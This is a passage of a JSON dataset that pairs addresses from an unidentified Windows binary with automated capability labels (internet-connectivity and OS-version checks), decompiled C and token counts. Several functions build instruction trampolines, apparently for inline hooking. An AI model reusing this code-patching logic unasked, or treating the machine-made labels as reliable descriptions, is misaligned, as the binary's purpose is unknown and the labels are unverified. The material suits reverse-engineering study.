            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061f40(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        iVar1 = 0x21590068;\n    }\n    else if (arg_18h == 0) {\n        iVar1 = 0x21590069;\n    }\n    else {\n        iVar1 = fcn.00062110(arg_ch, arg_10h, &var_4h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00061fc0(arg_8h, var_4h, arg_14h, arg_18h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 251
    },
    "00061fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061fc0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00062630(arg_8h, arg_ch, &var_ch, &var_10h, &var_4h);\n    if (var_8h == 0) {\n        var_8h = fcn.000636c0(var_ch, arg_10h, arg_14h);\n        if (var_8h == 0) {\n            *(*arg_14h + 0x74) = arg_8h;\n        }\n        fcn.00061f20(var_10h, var_4h);\n    }\n    return var_8h;\n}\n",
        "token_count": 202
    },
    "00062030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062030(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        var_ch = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        var_ch = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        var_ch = 0x21590068;\n    }\n    else {\n        var_ch = fcn.00062110(arg_ch, arg_10h, &var_4h);\n        if ((var_ch == 0) && (var_ch = fcn.00062630(arg_8h, var_4h, arg_14h, &var_10h, &var_8h),  var_ch == 0)) {\n            fcn.00061f20(var_10h, var_8h);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 255
    },
    "000620c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000620c0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00062630(arg_8h, arg_ch, arg_10h, &var_ch, &var_4h);\n    if (var_8h == 0) {\n        fcn.00061f20(var_ch, var_4h);\n    }\n    return var_8h;\n}\n",
        "token_count": 125
    },
    "00062110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062110(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_270h;\n    uint var_26ch;\n    int32_t var_268h;\n    uint var_264h;\n    uint var_260h;\n    int32_t var_1c4h;\n    int32_t var_1c0h;\n    int32_t var_1b0h;\n    int32_t var_1a0h;\n    uint var_198h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_268h = 0x21590065;\n    }\n    else if (arg_ch == 0) {\n        var_268h = 0x21590066;\n    }\n    else if (arg_10h == NULL) {\n        var_268h = 0x21590067;\n    }\n    else {\n        var_268h = fcn.0005cd70(arg_8h, arg_ch, &var_264h);\n        if (var_268h == 0) {\n            var_270h = var_264h;\n            var_4h = 0x40;\n            var_268h = fcn.00061c80(&var_270h, &var_4h, 1, &var_26ch);\n            if (var_268h == 0) {\n                fcn.000610a0(&var_260h);\n                fcn.00061140(&var_260h, 0x20);\n                fcn.000611a0(&var_260h, 0);\n                fcn.00060ce0(&var_260h, var_264h, 0x40);\n                var_268h = -1;\n                do {\n                    iVar1 = fcn.000610e0(&var_260h);\n                    if (iVar1 == 0) goto code_r0x0006225a;\n                } while ((((var_1c4h != 0x118) || (var_1c0h != 0x8c)) || (var_1b0h != 0x25)) || (var_1a0h != 0x8f));\n                *arg_10h = var_198h;\n                var_268h = 0;\ncode_r0x0006225a:\n                fcn.00061ce0(var_270h, var_4h, var_26ch);\n            }\n        }\n    }\n    return var_268h;\n}\n",
        "token_count": 575
    },
    "00062280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00062280(void)\n\n{\n    uint32_t *puVar1;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_18h = fcn.00062740(0x800da9ac);\n    if (var_18h == 0) {\n        puVar1 = fcn.00063fe0();\n        if (puVar1 == NULL) {\n            var_18h = 0x21590005;\n        }\n        else {\n            if ((*puVar1 < *0x800da9e8) || (*0x800da9e8 + *0x800da9ec <= *puVar1)) {\n                var_4h = 0;\n                while ((var_4h < *0x800da9ec - 8U &&\n                       ((((*(*0x800da9ac + var_4h) != puVar1 || (*(*0x800da9ac + var_4h + -2) != 0x5c7)) ||\n                         (var_10h = (*(*0x800da9ac + var_4h + 4) - *0x800da9e8) + *0x800da9ac,  var_10h < *0x800da9ac))\n                        || (*0x800da9ac + *0x800da9ec <= var_10h + puVar1[2] * 4))))) {\n                    var_4h = var_4h + 1;\n                }\n            }\n            else {\n                var_10h = (*puVar1 - *0x800da9e8) + *0x800da9ac;\n            }\n            if (var_10h == 0) {\n                var_18h = 0x21590005;\n            }\n            else {\n                *0x800da9a8 = fcn.000356c0(puVar1[2] << 2);\n                if (*0x800da9a8 == 0) {\n                    var_18h = 0x21590004;\n                }\n                else {\n                    fcn.00078be8(*0x800da9a8, var_10h, puVar1[2] << 2);\n                    var_18h = 0;\n                }\n            }\n        }\n        if (var_18h != 0) {\n            fcn.000357f0(*0x800da9ac);\n            *0x800da9ac = 0;\n            fcn.000357f0(*0x800da9a8);\n            *0x800da9a8 = 0;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 631
    },
    "00062430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00062430(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_140h;\n    int32_t var_13ch;\n    uint var_138h;\n    uint32_t *var_120h;\n    uint var_11ch;\n    uint32_t *var_118h;\n    uint32_t var_114h;\n    uint var_110h;\n    int32_t iStack272;\n    int32_t var_4h;\n    \n    var_120h = NULL;\n    if (arg_8h == NULL) {\n        var_13ch = 0x21590065;\n    }\n    else if (*0x800da9b0 == 0xffffffff) {\n        var_13ch = 0x21590005;\n    }\n    else if (*0x800da9b0 == 0) {\n        *0x800da9b0 = 0xffffffff;\n        var_13ch = fcn.00034cf0(0x10, &var_120h);\n        if (var_13ch == 0) {\n            var_118h = var_120h + 1;\n            var_13ch = 0x21590005;\n            for (var_114h = 0; var_114h < *var_120h; var_114h = var_114h + 1) {\n                iVar1 = (**0x800511d8)(var_118h[var_114h * 4], &var_11ch);\n                if (iVar1 == 0) {\n                    (**0x800511c4)(var_11ch, &var_138h);\n                    var_4h = fcn.00078bb2(*(var_118h + var_114h * 0x10 + 6), 1, &var_110h, 0x104, 0);\n                    (**0x800511bc)(&var_138h);\n                    if ((((var_4h == 0) && (iStack272 != 0)) && (var_110h == 0x20)) &&\n                       (iVar1 = fcn.000789a8(iStack272, 0x80055818, 0x20),  iVar1 == 0)) {\n                        *0x800da9b0 = var_118h[var_114h * 4];\n                        *arg_8h = *0x800da9b0;\n                        (**0x800512e0)();\n                        var_13ch = 0;\n                        break;\n                    }\n                    (**0x800512e0)();\n                }\n            }\n            fcn.000357f0(var_120h);\n        }\n    }\n    else {\n        *arg_8h = *0x800da9b0;\n        var_13ch = 0;\n    }\n    return var_13ch;\n}\n",
        "token_count": 639
    },
    "00062630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062630(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    *arg_18h = 0;\n    if (arg_8h == 1) {\n        var_8h = fcn.00063fe0();\n        if (var_8h == NULL) {\n            return -1;\n        }\n    }\n    else {\n        if (arg_8h != 2) {\n            return 0x21590065;\n        }\n        iVar1 = fcn.00063ff0();\n        if (iVar1 == 0) {\n            return -1;\n        }\n        iVar2 = fcn.000627d0(arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        var_8h = iVar1 + 0x10;\n        arg_ch = arg_ch - 0x1000;\n    }\n    if (arg_ch < var_8h[2] || arg_ch == var_8h[2]) {\n        if ((*0x800da9a8 == 0) || (arg_8h != 1)) {\n            *arg_10h = *(*var_8h + arg_ch * 4);\n        }\n        else {\n            *arg_10h = *(*0x800da9a8 + arg_ch * 4);\n        }\n        var_ch = 0;\n    }\n    else {\n        var_ch = 0x21590066;\n    }\n    if (var_ch != 0) {\n        fcn.00062870(*arg_14h, *arg_18h);\n    }\n    return var_ch;\n}\n",
        "token_count": 442
    },
    "00062740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062740(uint arg_8h)\n\n{\n    int32_t var_114h;\n    uint var_110h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00034cf0(0xb, &var_114h);\n    if (var_4h == 0) {\n        var_8h = var_114h + 4;\n        fcn.0002c4c0(&var_110h, 0x104, 0x8005583c, var_114h + 0x20 + *(var_114h + 0x1e));\n        var_4h = fcn.0005c9b0(0, &var_110h, *(var_8h + 8), arg_8h, 0);\n        fcn.000357f0(var_114h);\n    }\n    return var_4h;\n}\n",
        "token_count": 218
    },
    "000627d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000627d0(uint *arg_8h, int32_t *arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    *arg_ch = 0;\n    var_4h = fcn.00062430(&var_10h);\n    if (var_4h == 0) {\n        var_8h = fcn.000356f0(0x18);\n        if (var_8h == 0) {\n            var_4h = 0x21590004;\n        }\n        else {\n            var_4h = (**0x800511d8)(var_10h, &var_ch);\n            if (var_4h == 0) {\n                (**0x800511c4)(var_ch, var_8h);\n                *arg_8h = var_ch;\n                *arg_ch = var_8h;\n            }\n            else {\n                fcn.000357f0(var_8h);\n                var_4h = fcn.00078a2c(var_4h);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 278
    },
    "00062870": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00062870(int32_t arg_8h, uint arg_ch)\n\n{\n    if (arg_8h != 0) {\n        (**0x800511bc)(arg_ch);\n        (**0x800512e0)();\n        fcn.000357f0(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "000628a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000628a0(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_274h;\n    uint var_270h;\n    int32_t var_1d4h;\n    int32_t var_1d0h;\n    int32_t var_1b0h;\n    uint var_1a8h;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8dd0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.000628a0::var_10h;\n    puStack28 = &stack0xfffffd68;\n    var_27ch = 0;\n    fcn.000610a0(&fcn.000628a0::var_270h);\n    fcn.00061140(&fcn.000628a0::var_270h, 0x20);\n    fcn.000611a0(&fcn.000628a0::var_270h, 0);\n    iVar1 = (**0x8005128c)(*0x80051264, 0x1000, 0, 0, 0);\n    if (iVar1 == 0) {\n        var_27ch = 0;\n    }\n    else {\n        var_4h = 0;\n        (**0x80051298)(iVar1, 0, 0);\n        arg_ch = (**0x800510e4)(iVar1, 0, 1, 0, 0, 0x10);\n        if (arg_ch != 0) {\n            fcn.00060ce0(&fcn.000628a0::var_270h, arg_ch, 0x1000);\n            do {\n                iVar2 = fcn.000610e0(0x629b8);\n                if ((((iVar2 == 0) || (var_1d4h == 0x1be)) || (var_1d4h == 0x1bf)) ||\n                   (uVar3 = fcn.000611d0(&fcn.000628a0::var_270h),  0xfeb < uVar3)) goto code_r0x00062a66;\n            } while (((var_1d4h != 0xf4) || (var_1d0h != 0x8c)) || (var_1b0h != 0x8d));\n            var_27ch = var_1a8h;\n        }\ncode_r0x00062a66:\n        var_4h = 0xffffffff;\n        if (arg_ch != 0) {\n            (**0x800510a8)(arg_ch, iVar1);\n        }\n        (**0x80051294)(iVar1);\n        if (iVar1 != 0) {\n            (**0x800512a4)(iVar1);\n        }\n    }\n    *in_FS_OFFSET = var_10h;\n    return var_27ch;\n}\n",
        "token_count": 750
    },
    "00062b00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00062b00(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t **arg_18h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_274h;\n    uint var_270h;\n    int32_t var_26ch;\n    uint var_268h;\n    int32_t *var_264h;\n    uint var_260h;\n    int32_t var_1c4h;\n    int32_t var_1c0h;\n    uint var_1bch;\n    int32_t var_1b8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        var_26ch = 0x21590065;\n    }\n    else if (arg_10h == 0) {\n        var_26ch = 0x21590066;\n    }\n    else if (arg_18h == NULL) {\n        var_26ch = 0x2159006a;\n    }\n    else {\n        var_264h = fcn.000356f0(0x8c);\n        if (var_264h == NULL) {\n            var_26ch = 0x21590004;\n        }\n        else {\n            fcn.00078bfa(var_264h, 0, 0x8c);\n            arg_8h_00 = var_264h;\n            var_264h[0x22] = 1;\n            var_264h[0x1d] = 0;\n            var_264h[2] = arg_8h;\n            var_264h[1] = 0;\n            var_264h[6] = 0;\n            fcn.000610a0(&var_260h);\n            fcn.00061140(&var_260h, 0x20);\n            fcn.000611a0(&var_260h, 0);\n            fcn.00060ce0(&var_260h, arg_8h, arg_10h + 0xe);\n            var_4h = 0;\n            while ((arg_8h_00[1] < arg_10h && (iVar1 = fcn.000610e0(&var_260h),  iVar1 != 0))) {\n                if ((var_1c4h == 0x1be) || (var_1c4h == 0x1bf)) {\n                    return 0x2159000e;\n                }\n                iVar1 = fcn.000611d0(&var_260h);\n                var_4h = var_4h + iVar1;\n                arg_8h_00[1] = arg_8h_00[1] + iVar1;\n            }\n            var_26ch = fcn.00063260(arg_8h_00, var_4h + 6);\n            if (var_26ch == 0) {\n                fcn.00060ce0(&var_260h, arg_8h, arg_8h_00[1]);\n                arg_10h = 0;\n                var_4h = 0;\n                while ((arg_10h < arg_8h_00[1] && (iVar1 = fcn.000610e0(&var_260h),  iVar1 != 0))) {\n                    if ((var_1c4h == 0xde) && ((var_1c0h == 0x90 && (var_1bch == '\\b')))) {\n                        iVar1 = arg_8h_00[6];\n                        iVar2 = fcn.000611d0(&var_260h);\n                        var_26ch = fcn.00063260(arg_8h_00, (iVar1 + 6) - iVar2);\n                        if (var_26ch != 0) goto code_r0x0006309f;\n                        uVar5 = 0;\n                        uVar4 = 0;\n                        puVar3 = &var_260h;\n                        iVar1 = fcn.000611d0(puVar3);\n                        var_26ch = fcn.000633c0(*arg_8h_00 + var_4h, iVar1 + arg_8h + arg_10h + var_1b8h, puVar3, uVar4\n                                                , uVar5);\n                        if (var_26ch != 0) goto code_r0x0006309f;\n                        var_4h = var_4h + 6;\n                    }\n                    else if (((var_1c4h == 0x232) ||\n                             ((((var_1c4h == 0xe5 || (var_1c4h == 0xe4)) || (var_1c4h == 0xe2)) ||\n                              ((var_1c4h == 0x231 || (var_1c4h == 0xe6)))))) &&\n                            ((var_1c0h == 0x90 && (var_1bch == '\\b')))) {\n                        var_26ch = fcn.00063260(arg_8h_00, arg_8h_00[6] + 6);\n                        if (var_26ch != 0) goto code_r0x0006309f;\n                        *(*arg_8h_00 + var_4h) = *(arg_8h + arg_10h);\n                        *(var_4h + 1 + *arg_8h_00) = (arg_8h_00[6] - var_4h) + -8;\n                        uVar5 = 0;\n                        uVar4 = 0;\n                        puVar3 = &var_260h;\n                        iVar1 = fcn.000611d0(puVar3);\n                        var_26ch = fcn.000633c0(*arg_8h_00 + -6 + arg_8h_00[6], iVar1 + arg_8h + arg_10h + var_1b8h, \n                                                puVar3, uVar4, uVar5);\n                        if (var_26ch != 0) goto code_r0x0006309f;\n                        iVar1 = fcn.000611d0(&var_260h);\n                        arg_10h = iVar1 + arg_10h;\n                        iVar1 = fcn.000611d0(&var_260h);\n                        var_4h = iVar1 + var_4h;\n                    }\n                    else {\n                        uVar4 = fcn.000611d0(&var_260h);\n                        fcn.00078be8(*arg_8h_00 + var_4h, arg_8h + arg_10h, uVar4);\n                        iVar1 = fcn.000611d0(&var_260h);\n                        arg_10h = iVar1 + arg_10h;\n                        iVar1 = fcn.000611d0(&var_260h);\n                        var_4h = iVar1 + var_4h;\n                        if (((var_1c4h == 0x18) && (var_1c0h == 0x90)) && (var_1bch == ' ')) {\n                            *(*arg_8h_00 + -4 + var_4h) = (arg_8h - *arg_8h_00) + var_1b8h + arg_ch;\n                        }\n                        if (((var_1c4h == 0xde) && (var_1c0h == 0x90)) && (var_1bch == ' ')) {\n                            *(*arg_8h_00 + -4 + var_4h) = (arg_8h - *arg_8h_00) + var_1b8h + arg_ch;\n                        }\n                        if ((var_1c4h == 0x224) && (arg_10h == 1)) {\n                            iVar1 = fcn.00035150();\n                            if (iVar1 == 3) {\n                                **arg_8h_00 = 0x55;\n                            }\n                            else if (iVar1 == 9) {\n                                **arg_8h_00 = 0x8b;\n                            }\n                        }\n                    }\n                }\n                var_26ch = fcn.000633c0(*arg_8h_00 + var_4h, arg_8h + arg_8h_00[1] + arg_ch, 0, 0, 0);\n                if ((var_26ch == 0) &&\n                   ((arg_14h == 0 || (var_26ch = fcn.00063300(arg_8h, arg_8h_00[1], 0, arg_8h_00),  var_26ch == 0)))) {\n                    *arg_18h = var_264h;\n                    var_26ch = 0;\n                }\n            }\ncode_r0x0006309f:\n            if (var_26ch != 0) {\n                fcn.000630d0(&var_264h);\n            }\n        }\n    }\n    return var_26ch;\n}\n",
        "token_count": 2069
    },
    "000630d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000630d0(int32_t **arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != NULL) && (*arg_8h != NULL)) {\n        arg_8h_00 = *arg_8h;\n        *arg_8h = NULL;\n        if (arg_8h_00[5] != arg_8h_00 + 0x10) {\n            fcn.000357f0(arg_8h_00[5]);\n        }\n        if (*arg_8h_00 != arg_8h_00 + 0x57) {\n            fcn.000357f0(*arg_8h_00);\n        }\n        fcn.00078bfa(arg_8h_00, 0, 0x70);\n        fcn.000357f0(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00063160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063160(int32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if ((arg_8h == 0) || (*(arg_8h + 8) == 0)) {\n        uVar2 = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.000634d0();\n        if (uVar1 == 0) {\n            uVar2 = 0x21590064;\n        }\n        else {\n            uVar2 = fcn.00063440(arg_8h + 0x2cU & 0xffffff00 | uVar1, *(arg_8h + 8), 0x800b8960, 1, arg_8h + 0x2cU, \n                                 arg_ch);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 209
    },
    "000631d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000631d0(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (*(arg_8h + 0x70) == 0) {\n        **(arg_8h + 8) = **(arg_8h + 0x14);\n    }\n    else if (*(arg_8h + 0x70) == 1) {\n        for (var_4h = 0; var_4h < *(arg_8h + 4); var_4h = var_4h + 1) {\n            *(*(arg_8h + 8) + var_4h) = *(*(arg_8h + 0x14) + *(arg_8h + 0xc) + var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00063260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063260(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    if (arg_ch < 0x18) {\n        *arg_8h = arg_8h + 0x57;\n    }\n    else {\n        iVar1 = fcn.000356f0(arg_ch);\n        *arg_8h = iVar1;\n        if (*arg_8h == 0) {\n            return 0x21590004;\n        }\n    }\n    if ((arg_8h_00 != 0) && (arg_8h_00 != *arg_8h)) {\n        fcn.00078be8(*arg_8h, arg_8h_00, arg_8h[6]);\n    }\n    if ((arg_8h_00 != 0) && (arg_8h_00 != arg_8h + 0x57)) {\n        fcn.000357f0(arg_8h_00);\n    }\n    arg_8h[6] = arg_ch;\n    return 0;\n}\n",
        "token_count": 276
    },
    "00063300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00063300(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        var_8h = arg_8h;\n        *(arg_14h + 0x10) = arg_ch;\n    }\n    else {\n        var_4h = fcn.00061d40(arg_8h, arg_ch, &var_8h, arg_14h + 0x10);\n        if (var_4h != 0) {\n            return var_4h;\n        }\n    }\n    if (*(arg_14h + 0x10) < 0x18) {\n        *(arg_14h + 0x14) = arg_14h + 0x40;\n    }\n    else {\n        uVar1 = fcn.000356f0(*(arg_14h + 0x10));\n        *(arg_14h + 0x14) = uVar1;\n        if (*(arg_14h + 0x14) == 0) {\n            *(arg_14h + 0x10) = 0;\n            return 0x21590004;\n        }\n    }\n    fcn.00078be8(*(arg_14h + 0x14), var_8h, *(arg_14h + 0x10));\n    *(arg_14h + 0xc) = arg_8h - var_8h;\n    return 0;\n}\n",
        "token_count": 368
    },
    "000633c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000633c0(uchar *arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    uchar *var_4h;\n    \n    var_4h = arg_8h;\n    if (arg_14h != NULL) {\n        *arg_8h = 0x6a;\n        arg_8h[1] = arg_18h;\n        var_4h = arg_8h + 2;\n    }\n    *var_4h = 0x68;\n    fcn.00071080(var_4h + 1, arg_ch);\n    var_4h[5] = 0xc3;\n    if (arg_10h == 0) {\n        if (arg_14h != NULL) {\n            *arg_14h = 0;\n        }\n    }\n    else if (arg_14h != NULL) {\n        *arg_14h = var_4h + 5;\n    }\n    return 0;\n}\n",
        "token_count": 235
    },
    "00063440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00063440(uint arg_8h, int32_t arg_ch, uint noname_2, int32_t arg_14h, uint *arg_18h, uint arg_1ch)\n\n{\n    uchar *var_8h;\n    uint var_4h;\n    \n    var_4h = CONCAT13(arg_8h, CONCAT12(0xcd, CONCAT11(arg_1ch, 0x6a)));\n    fcn.00071080(arg_ch, var_4h);\n    var_8h = arg_ch + 3;\n    if ((arg_14h != 0) && (arg_8h != -0x3d)) {\n        var_8h = arg_ch + 4;\n        *var_8h = 0xc3;\n    }\n    if (arg_14h == 0) {\n        if (arg_18h != NULL) {\n            *arg_18h = 0;\n        }\n    }\n    else if (arg_18h != NULL) {\n        *arg_18h = var_8h;\n    }\n    return 0;\n}\n",
        "token_count": 255
    },
    "000634e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
